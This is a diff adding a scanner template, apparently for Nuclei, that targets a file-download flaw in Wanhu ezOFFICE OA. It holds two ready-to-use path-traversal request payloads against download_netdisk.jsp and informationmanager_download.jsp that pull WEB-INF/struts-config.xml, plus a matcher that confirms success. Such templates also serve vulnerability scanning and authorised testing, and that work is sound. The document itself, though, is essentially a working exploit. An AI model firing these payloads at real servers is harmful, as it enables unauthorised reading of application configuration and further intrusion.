@@ -1,0 +1,35 @@
+id: wanhu-ezoffice-download_netdisk-filedownload
+info:
+  name: 万户 ezoffice download_netdisk & informationmanager_download - filedownload
+  author: leadlife
+  severity: high
+  description: 
+  reference: 
+    - https://github.com/qsdj/cncs-armory-ktrimisu/blob/d01419ed32d0e0e2f60fae5352dedc766f62a3a6/pocs/cms/%E4%B8%87%E6%88%B7OA/Whir_0008.py#L54
+  metadata:
+    verified: true
+    max-request: 1
+    fofa-query: demo
+    hunter-query: demo
+    tips:
+    repair:
+    version:
+  tags: 2014,wanhu,filedownload,oa,hw,ezoffice
+
+http:
+  - raw:
+      - |
+        GET {{exp}} HTTP/1.1
+        Host: {{Hostname}}
+      
+    payloads:
+      exp:
+        - '/defaultroot/netdisk/download_netdisk.jsp?path=1&fileName=../../WEB-INF/struts-config&fileExtName=xml&fileSaveName=file'
+        - '/defaultroot/information_manager/informationmanager_download.jsp?path=..&FileName=WEB-INF/struts-config.xml&name=file'
+
+    matchers:
+      - type: dsl
+        dsl:
+          - status_code == 200
+          - contains(body,'struts-config')
+        condition: and
